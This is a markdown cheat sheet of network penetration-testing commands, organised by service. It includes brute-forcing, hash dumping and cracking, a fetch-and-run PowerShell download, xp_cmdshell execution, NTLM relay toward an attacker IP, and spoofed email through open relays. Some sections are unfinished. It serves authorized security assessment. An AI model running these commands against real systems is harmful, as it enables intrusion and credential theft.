Use the Outline (top-right on GitHub) to quickly navigate. If you're a real hacker, feel free to open this in Obsidian. It should look the same.
## Information Gathering

### Host Discovery
```sh
# ping
sudo nmap -PE -sn -iL ranges.txt -oA ping
# tcp (discovery)
nmap -n -Pn -T4 --min-hostgroup 128 --max-retries 0 --top-ports 50 -iL ranges.txt -oA tcp-discovery
# udp (discovery)
sudo nmap -n -Pn --min-hostgroup 128 -sU -p 53,69,111,123,161,514,1900 -iL ranges.txt -oA udp
```

```sh
# get live hosts
grep Up ping.gnmap | cut -d ' ' -f 2 > live-ping.txt
grep 'open/' tcp-discovery.gnmap | cut -d ' ' -f 2 > live-tcp.txt
grep 'open/' udp.gnmap | cut -d ' ' -f 2 > live-udp.txt
sort -uV live-ping.txt live-tcp.txt live-udp.txt > live.txt

# sample live hosts for further testing
shuf -n <num> live.txt | sort -uV > targets.txt
```
### Service Scan
```sh
sudo nmap -n -Pn --min-hostgroup 128 --max-retries 0 -p- -sV -O -iL targets.txt -oA tcp-full
```

```sh
# export to html for viewing in web browser
xsltproc ping.xml -o ping.html
xsltproc tcp-discovery.xml -o tcp-discovery.html
xsltproc udp.xml -o udp.html
xsltproc tcp-full.xml -o tcp-full.html
```
## Outdated Versions
### Find
```sh
nmap -Pn -p <ports> -sV --script vulners <target>
# manual review of tcp-full.html
# vulnerability scans (eg. Nessus)
```
### Verify
```sh
curl -sik http(s)://<target>
nmap -Pn -p <port> -sV <target>
nmap -Pn -p 443 --script vmware-version <target>
```
## Services

### Terminal Access
#### SSH (22)
- default password
- weak password
- weak encryption
- password authentication

```sh
grep 22/open//ssh// tcp-full.gnmap | cut -d ' ' -f 2 > ssh.txt

# manually review for SSH on non-default ports with
grep -P ' (?!22)\d+/open//ssh//' tcp-full.gnmap
```

**Default Password**
1. get device type - check other accessible services, especially web
2. search default password on ChatGPT or Google
3. `sshpass -p <password> ssh <user>@<target>`

**Weak Password**
```sh
echo -en "root\nadmin" > usernames.txt
echo -en "\nroot\nadmin\npassword" > passwords.txt
hydra -M ssh.txt -L usernames.txt -P passwords.txt ssh -t 4
nxc ssh ssh.txt -u usernames.txt -p passwords.txt -t 4
```

**Weak Encryption**
```sh
nmap -Pn -p 22 --script ssh2-enum-algos <target>
ssh-audit -l warn -p 22 <target>
```

**Password Authentication**
```sh
nmap -Pn -p 22 --script ssh-auth-methods <target>
```
#### Telnet (23)
- default/no password
- weak password
- insecure protocol

```sh
grep 23/open//telnet// tcp-full.gnmap | cut -d ' ' -f 2 > telnet.txt
cp telnet.txt temp.txt

# manually review for Telnet on non-default ports with
grep -P ' (?!23)\d+/open//telnet//' tcp-full.gnmap
```

**Default/No Password**
1. `for i in $(cat temp.txt); do telnet $i; done`
2. get device type - observe banner or check other accessible services, especially web
3. search default password on ChatGPT or Google
4. enter default credentials
5. on failure, `Ctrl+]` followed by `quit`\
If the service hangs, `Ctrl+C`, edit temp.txt, remove all hosts up to and including the offending host.

**Weak Password**
```sh
echo -en "root\nadmin" > usernames.txt
echo -en "\nroot\nadmin\npassword" > passwords.txt
hydra -M telnet.txt -L usernames.txt -P passwords.txt telnet -t 4 # ***** verify this
```

**Insecure Protocol**
```sh
sed 's/$/ (tcp/23)/' telnet.txt
# copy-and-paste to affected hosts
```
### File Sharing
#### FTP (21)
- anonymous login
- default password
- weak password
- insecure protocol

```sh
grep 21/open//ftp// tcp-full.gnmap | cut -d ' ' -f 2 > ftp.txt

# manually review for FTP on non-default ports with
grep -P ' (?!21)\d+/open//ftp//' tcp-full.gnmap
```

**Anonymous Login**
```sh
nmap -n -Pn -p 21 --script ftp-anon -iL ftp.txt -oA ftp-anon
grep allowed ftp-anon.nmap -B 6 | grep report | cut -d ' ' -f 5 > ftp-anon.txt
sed 's/$/ (tcp/21)/' ftp-anon.txt
```

**Default Password**\
I don't check for default passwords on FTP because this is usually covered by other services, especially web (HTTP).

**Weak Password**
```sh
echo -en "root\nadmin" > usernames.txt
echo -en "\nroot\nadmin\npassword" > passwords.txt
hydra -M ftp.txt -L usernames.txt -P passwords.txt ftp -t 4
nxc ftp ftp.txt -u usernames.txt -p passwords.txt -t 4
```

**Insecure Protocol**
```sh
sed 's/$/ (tcp/21)/' ftp.txt
# copy-and-paste to affected hosts
```
#### SMB (139,445)
- null session (blank username, blank password)
- guest session (username Guest, no password)
- default password - only special cases like printers or IoT devices
- weak password - tied to Active Directory on domain-joined machines
- known CVEs
- insecure protocol (SMBv1)
- signing not required
- excessive share or NTFS ACLs

```sh
# from network scan
grep 445/open tcp-full.gnmap | cut -d ' ' -f 2 > smb-network.txt

# from Active Directory (optional)
GetADComputers.py <domain>/<user>:<password> | sed '1,5d' | tr -s ' ' | cut -d ' ' -f 2 | grep -v '^$' | tee computers.txt
nmap -n -Pn -p 445 -sV -iL computers.txt -oA smb-domain
grep 445/open smb-domain.gnmap | cut -d ' ' -f 2 > smb-domain.txt

sort -uV smb-network.txt smb-domain.txt > smb.txt
```

```sh
# get domain controllers
dnsrecon -d <domain> -t SRV | egrep -v 'Found$|\*' | awk '{print $4 ":" $5}' | sort -u > dcs.txt
cut -d ':' -f 1 | sort -u > dcs-dns.txt
cut -d ':' -f 2 | sort -uV > dcs-ip.txt
```

**Null Session**
```sh
# list shares
nxc smb smb.txt -u '' -p '' --shares

# enumerate domain accounts
nxc smb dcs-ip.txt -u '' -p '' --rid-brute
for i in $(cat dcs-ip.txt); do rpcclient -U '' -N $i -c enumdomusers; done
for i in $(cat dcs-ip.txt); do rpcclient -U '' -N $i -c 'queryuser 500'; done
```

**Guest Session**
```sh
# list shares
nxc smb smb.txt -u Guest -p '' --shares

# enumerate domain accounts
nxc smb dcs-ip.txt -u Guest -p '' --rid-brute
for i in $(cat dcs-ip.txt); do rpcclient -U Guest -N $i -c enumdomusers; done
for i in $(cat dcs-ip.txt); do rpcclient -U Guest -N $i -c 'queryuser 500'; done
```

**Default Password**\
I don't check for default passwords on SMB because this only applies in niche cases and is usually covered by other services, especially web (HTTP).

**Weak Password**
```sh
# local accounts
echo -en "root\nadmin" > usernames.txt
echo -en "\nroot\nadmin\npassword" > passwords.txt
hydra -M smb.txt -L usernames.txt -P passwords.txt smb -t 4
nxc smb smb.txt -u usernames.txt -p passwords.txt --local-auth -t 4

# domain accounts - better handled with kerberos pre-auth
```

**Known CVEs**
```sh
# be careful running this
nmap -n -Pn -p 445 --script "smb-vuln-*" -iL smb.txt -oA smb-vuln
# manually review

# alternatively, search a specific CVE
ll /usr/share/nmap/scripts/smb-vuln-* # list all relevant nmap scripts
nmap -n -Pn -p 445 --script smb-vuln-ms17-010 -iL smb.txt -oA smb-ms17-010
grep VULNERABLE smb-ms17-010.nmap -B 8 | grep report | cut -d ' ' -f 5 > smb-ms17-010.txt
sed 's/$/ (tcp/445)/' smb-ms17-010.txt
```

**Insecure Protocol (SMBv1)**
```sh
nmap -n -Pn -p 445 --script smb-protocols -iL smb.txt -oA smb-protocols
grep SMBv1 smb-protocols.nmap -B 9 | grep report | cut -d ' ' -f 5 > smb1.txt
sed 's/$/ (tcp/445)/' smb1.txt
```

**Signing Not Required**
```sh
# SMBv1
nmap -n -Pn -p 445 --script smb-security-mode -iL smb1.txt -oA smb1-security-mode
grep disabled smb1-security-mode.nmap -B 11 | grep report | cut -d ' ' -f 5 > smb1-signing.txt

# SMBv2
nmap -n -Pn -p 445 --script smb2-security-mode -iL smb.txt -oA smb2-security-mode
grep not smb2-security-mode.nmap -B 9 | grep report | cut -d ' ' -f 5 > smb2-signing.txt

sort -uV smb1-signing.txt smb2-signing.txt > smb-signing.txt
sed 's/$/ (tcp/445)/' smb-signing.txt
```

**Excessive Share/NTFS ACLs**
```powershell
# password
runas /netonly /user:<domain>\<user> powershell.exe
# NT hash
Rubeus asktgt /domain:<domain> /dc:<dc> /user:<user> /rc4:<NT hash> /ptt
# Kerberos ticket
Rubeus ptt /ticket:<ticket>

# search share contents
Snaffler.exe -d <domain> -v data -s -o snaffler.txt -y
.\snafflerParser.ps1 -in .\snaffler.txt
# review in browser, sorting by date
```
- Snaffler: https://github.com/SnaffCon/Snaffler
- SnafflerParser: https://github.com/zh54321/SnafflerParser

```powershell
Get-Acl <share file> # this checks NTFS ACLs
Get-Content <share file>
```
In File Explorer, navigate to `<share directory>` to view files: `\\computer.domain.com\share\file`
#### NFS (2049)
- share enumeration
- publicly mountable shares

```sh
grep 2049/open//nfs// tcp-full.gnmap | cut -d ' ' -f 2 > nfs.txt
cp telnet.txt temp.txt

# manually review for NFS on non-default ports with
grep -P ' (?!2049)\d+/open//nfs//' tcp-full.gnmap
```

**Share Enumeration**
```sh
nmap -Pn -p 2049 --script nfs-ls -iL nfs.txt -oA nfs-ls
nmap -Pn -p 2049 --script nfs-showmount -iL nfs.txt -oA nfs-showmount

rpcinfo -p <target>
showmount -e <target>
```

**Publicly Mountable Shares**
```sh
sudo su
mkdir /mnt/temp
mount -t nfs <target>:/<mount> /mnt/temp
cd /mnt/temp

umount /mnt/temp
```
If you observe a .vmdk file,
```sh
apt install kpartx

mkdir /mnt/new
kpartx -av <flat vmdk>
mount /dev/mapper/loop0p1 /mnt/new # change, selecting loop with largest size

# if windows
cd /mnt/new/Windows/System32/config
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL

# if linux
unshadow /mnt/new/etc/passwd /mnt/new/etc/shadow > ~/hashes.txt
john ~/hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
### Database

#### MSSQL (1433)
- default password (unauth)
- excessive domain login permissions
- weak password (auth)
- impersonation
- linked servers
- shared SQL service account (NTLM relay)

```powershell
# import PowerUpSQL
IEX(IWR "https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1" -UseBasicParsing)
```

**Default Password (Unauthenticated)**
```powershell
$servers = Get-SQLInstanceBroadcast -Verbose
$default = $servers | Get-SQLServerLoginDefaultPw -Verbose
$default
```

**Excessive Domain Login Permissions**
```powershell
# password
runas /netonly /user:<domain>\<user> powershell.exe
# NT hash
Rubeus asktgt /domain:<domain> /dc:<dc> /user:<user> /rc4:<NT hash> /ptt
# Kerberos ticket
Rubeus ptt /ticket:<ticket>

$domain = Get-SQLInstanceDomain -DomainController <dc> -Verbose
$login = $domain | Get-SQLServerInfoThreaded -Threads 15 -Verbose
$login

# check if sysadmin
$login | where IsSysadmin -eq "Yes"
# if sysadmin, try
Invoke-SQLOSCmd -Instance <instance> -Command "whoami /priv" -RawResults
mssqlclient.py <domain>/<user>@<target> -windows-auth
> enable_xp_cmdshell
> xp_cmdshell whoami /priv
# usually, SQL service account has SeImpersonatePrivilege
# see https://github.com/tylerdotrar/SigmaPotato?tab=readme-ov-file#usage-from-memory-via-net-reflection-
```

**Weak Password (Authenticated)**
```powershell
$weak = $login | Invoke-SQLAuditWeakLoginPw –Verbose
$weak
```

**Impersonation**
*allows impersonating another SQL account (`<user>`)*
```powershell
SQLRecon.exe /a:wintoken /h:<target> /m:impersonate # check for impersonation
SQLRecon.exe /a:wintoken /h:<target> /m:iwhoami /i:<user>
SQLRecon.exe /a:wintoken /h:<target> /m:ienablexp /i:<user>
SQLRecon.exe /a:wintoken /h:<target> /m:ixpcmd /i:<user> /c:"whoami /priv"
```

**Linked Servers**
```powershell
SQLRecon.exe /a:wintoken /h:<target> /m:links
SQLRecon.exe /a:wintoken /h:<target> /m:lwhoami /l:<link>

# check xp_cmdshell
SQLRecon.exe /a:wintoken /h:<target> /m:lquery /l:<link> /c:"SELECT value FROM sys.configurations WHERE name = ''xp_cmdshell'';"
# if xp_cmdshell not 1, enable RPC if possible
SQLRecon.exe /a:wintoken /h:<target> /m:enablerpc /rhost:<link>
# enable xp_cmdshell over RPC
SQLRecon.exe /a:wintoken /h:<target> /m:lenablexp /l:<link>

SQLRecon.exe /a:wintoken /h:<target> /m:lxpcmd /l:<link> /c:"whoami /priv"
```

**Service Account NTLM Relay**
```powershell
# check for multiple SQL instances using the same service account
$domain | sort ComputerName -Unique | Group-Object DomainAccount | sort Count -Descending | select Count, Name | Where-Object { ($_.Name -notlike "*$") -and ($_.Count -gt 1) }

# login to one and trigger auth
mssqlclient.py <domain>/<user>@<sql1> -windows-auth
> xp_dirtree \\<attacker ip>\test

# relay
ntlmrelayx.py -smb2support -t mssql://<sql2> -socks
proxychains mssqlclient.py <domain>/<service>@<sql2> -no-pass -windows-auth
```
#### Oracle (1521)
- default/weak password

```sh
oscanner -f 
```
#### MySQL (3306)
- default/weak password
#### PostgreSQL (5432)
- default/weak password
#### Redis (6379)
- default/weak password
### Other
#### SMTP (25,465,587)
- open relay
- lack of sender validation
- cleartext authentication
- user enumeration

```sh
egrep '(25|465|587)/open//smtp//' tcp-full.gnmap | cut -d ' ' -f 2 > smtp.txt
egrep 25/open//smtp// tcp-full.gnmap | cut -d ' ' -f 2 > smtp-25.txt
egrep 465/open//smtp// tcp-full.gnmap | cut -d ' ' -f 2 > smtp-465.txt
egrep 587/open//smtp// tcp-full.gnmap | cut -d ' ' -f 2 > smtp-587.txt

# manually review for SMTP on non-default ports with
grep -P ' (?!25|465|587)\d+/open//smtp//' tcp-full.gnmap
```

**Open Relay**
```sh
# scan
nmap -n -Pn -p 25 --script smtp-open-relay -iL smtp-25.txt -oA smtp-relay-25
nmap -n -Pn -p 465 --script smtp-open-relay -iL smtp-465.txt -oA smtp-relay-465
nmap -n -Pn -p 587 --script smtp-open-relay -iL smtp-587.txt -oA smtp-relay-587

# get affected hosts
grep relay smtp-relay-25.nmap -B 5 | grep report | cut -d ' ' -f 5 > smtp-relay-25.txt
grep relay smtp-relay-465.nmap -B 5 | grep report | cut -d ' ' -f 5 > smtp-relay-465.txt
grep relay smtp-relay-587.nmap -B 5 | grep report | cut -d ' ' -f 5 > smtp-relay-587.txt

swaks --server smtp.client.com --from "employee@client.com" --to "you@consultancy.com" --header "From: First Last <employee@client.com>" --header "Subject: Consultancy Sample Email" --body "This is a sample email to illustrate the potential consequences of an open SMTP relay. The body could contain any text, and the from address could also be switched to impersonate any user."
# you may add custom --header "X-Mailer: " to avoid X-Mailer: swaks
# alternatively, use sendemail (not tested yet)
sendemail -s smtp.client.com -f "employee@client.com" -o message-header="From: First Last <employee@client.com>" -t "you@netspi.com" -u "Consultancy Sample Email" -m "This is a sample email to illustrate the potential consequences of an open SMTP relay. The body could contain any text, and the from address could also be switched to impersonate any user."
```

**Cleartext Authentication**
I unfortunately don't know of a good way to test this at scale. :( Maybe I'll write a script someday...
```sh
telnet <ip> 25
> EHLO x
> AUTH LOGIN
```

**User Enumeration**
```sh
smtp-user-enum -M <VRFY|EXPN|RCPT> -U <wordlist> -t <ip> | tee smtp-enum.txt
grep exists smtp-enum.txt | cut -d ' ' -f 2 > users.txt

# example
smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t 192.168.12.17 | tee smtp-enum.txt
```
#### SNMP (udp/161)
- default RW community string
- default RO community string
- insecure protocol (SNMPv1)

```sh
grep 161/open/ udp.gnmap | cut -d ' ' -f 2 > snmp.txt
```

**Default RO/RW Community String**
```sh
sudo nmap -n -Pn -sU -p 161 --script snmp-brute -iL snmp.txt -oA snmp-brute

# read permission
grep Valid snmp-brute.nmap -B 6 | grep report | cut -d ' ' -f 5 > snmp-brute.txt
sed 's/$/ (udp/161)/' snmp-brute.txt
snmp-check <target>

# write permission - no way to be 100% sure, but these are good indicators
# look for responses with 2 valid credentials
grep Valid snmp-brute.nmap -B 6
# search for well-known RW community string
egrep 'private|admin' snmp-brute.nmap -B 7
```

**Insecure Protocol**
No fully effective method to get all services supporting SNMPv1. You'll have to rely on the following:
1. expected responses from known SNMP implementations (Nmap service scan)
2. services accessible with a default community string
```sh
# expected responses from known SNMP implementations
sudo nmap -n -Pn -sU -p 161 -sV -iL snmp.txt -oA snmp
grep v1 snmp.nmap -B 4 | grep report | cut -d ' ' -f 5 > snmp1-nmap.txt

# combine
sort -uV snmp1-nmap.txt snmp-brute.txt > snmp1.txt
sed 's/$/ (udp/161)/' snmp1.txt
```
#### RDP (3389)
- known CVEs
- weak encryption

**Known CVEs**
```

```

**Weak Encryption**
```
```
#### Cisco
- Cisco Smart Install
- type 0 plaintext password
- type 7 encrypted password (reversible)
- exposed community strings

**Cisco Smart Install**
```sh
git clone https://github.com/frostbits-security/SIET
cd SIET
nmap -Pn -p 4786 --script ./cisco-siet.nse <ip>
python2 siet.py -g -i <ip>
# config in <ip>.conf
```

**Cisco Config File**
Things to look for:
```sh
# poor password storage
egrep -i '(password|secret)\s+(0|7)\s+' config.cfg
wget https://raw.githubusercontent.com/theevilbit/ciscot7/refs/heads/master/ciscot7.py
python3 ciscot7.py -p <password> # decrypt type 7 password
# check for SSH and attempt login

# SNMP community strings
grep 'snmp-server community' config.cfg
```